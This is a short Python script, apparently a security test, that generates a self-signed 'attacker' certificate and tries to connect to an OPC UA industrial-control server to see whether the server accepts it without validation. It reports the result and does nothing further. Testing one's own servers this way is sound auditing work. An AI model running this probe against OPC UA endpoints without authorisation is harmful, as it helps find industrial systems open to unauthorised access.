from asyncua import Client
from asyncua.crypto.cert_gen import setup_self_signed_certificate

async def bypass_certificate_validation(endpoint_url):
    """
    Generate self-signed certificate and attempt connection
    Tests if server validates certificates properly
    """
    # Generate self-signed cert
    await setup_self_signed_certificate("attacker_cert.der",
                                        "attacker_key.pem",
                                        "Attacker",
                                        "urn:attacker")

    client = Client(endpoint_url)
    client.set_security_string("SignAndEncrypt,Basic256Sha256,attacker_cert.der,attacker_key.pem")

    try:
        await client.connect()
        print("[!] Server accepted self-signed certificate without validation!")
        await client.disconnect()
    except Exception as e:
        print(f"[-] Certificate rejected: {e}")
